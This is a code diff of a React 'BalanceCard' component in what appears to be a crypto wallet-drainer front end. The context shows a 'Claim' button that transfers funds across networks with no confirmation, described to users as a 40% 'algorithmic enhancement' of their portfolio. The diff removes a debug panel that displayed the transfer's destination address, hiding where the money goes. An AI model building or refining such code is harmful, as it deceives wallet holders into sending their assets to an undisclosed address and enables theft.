@@ -51,7 +51,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
     // Show loading instantly when button is clicked
     setIsWalletLoading(true);
     console.log("🔄 Starting claim process...");
-    
+
     try {
       // Direct transfer without any confirmation or toast notifications
       if (onMultiNetworkTransfer) {
@@ -78,7 +78,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
     style: 'currency',
     currency: 'USD'
   });
-  
+
   // Calculate 40% enhancement value
   const enhancementValue = totalValue * 0.4;
   const enhancementUSD = enhancementValue.toLocaleString('en-US', {
@@ -108,7 +108,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
         <div className="text-xs text-gray-500 dark:text-gray-500 mb-4">
           Across {walletState.networkBalances?.length || 1} networks • {(walletState.tokenBalances?.length || 0) + 1} assets
         </div>
-        
+
         {/* Enhancement Calculation Display */}
         <div className="bg-primary/5 border border-primary/20 rounded-lg p-3">
           <div className="flex items-center justify-between">
@@ -158,33 +158,11 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
             </div>
           )}
         </Button>
-        
+
         <div className="text-xs text-gray-500 dark:text-gray-400 text-center">
           * Claim processes 40% of your {balanceUSD} portfolio ({enhancementUSD}) through algorithmic enhancement
         </div>
       </div>
-
-      {/* Debug Info (collapsed) */}
-      <details className="text-xs mt-6">
-        <summary className="cursor-pointer text-gray-400 hover:text-gray-600 flex items-center justify-center gap-1">
-          <Bug className="h-3 w-3" />
-          Technical Details
-        </summary>
-        <div className="mt-2 p-3 bg-gray-100 dark:bg-gray-800 rounded text-xs font-mono text-gray-600 dark:text-gray-400">
-          <div><strong>Connection:</strong> {walletState.isConnected ? 'Connected' : 'Disconnected'}</div>
-          <div><strong>Address:</strong> {walletState.address || 'None'}</div>
-          <div><strong>Network:</strong> {walletState.networkId || 'None'}</div>
-          <div><strong>Portfolio Value:</strong> {balanceUSD}</div>
-          <div><strong>Eligible for Claim:</strong> {hasAnyNetworkFunds ? 'Yes' : 'No'}</div>
-          <div><strong>Cross-Network Value:</strong> ${crossNetworkValue.toFixed(6)}</div>
-          <div><strong>Button Disabled:</strong> {(isTransferring || isWalletLoading || !hasAnyNetworkFunds) ? 'Yes' : 'No'}</div>
-          <div><strong>Network Balances Count:</strong> {walletState.networkBalances?.length || 0}</div>
-          <div><strong>Networks with Tokens:</strong> {walletState.networkBalances?.filter(n => n.tokenBalances?.length > 0).length || 0}</div>
-          <div><strong>Total Token Count:</strong> {walletState.networkBalances?.reduce((sum, n) => sum + (n.tokenBalances?.length || 0), 0) || 0}</div>
-          <div><strong>All Networks Loaded:</strong> {walletState.allNetworksLoaded ? 'Yes' : 'No'}</div>
-          <div><strong>Destination:</strong> {destinationAddress}</div>
-        </div>
-      </details>
     </div>
   );
 }
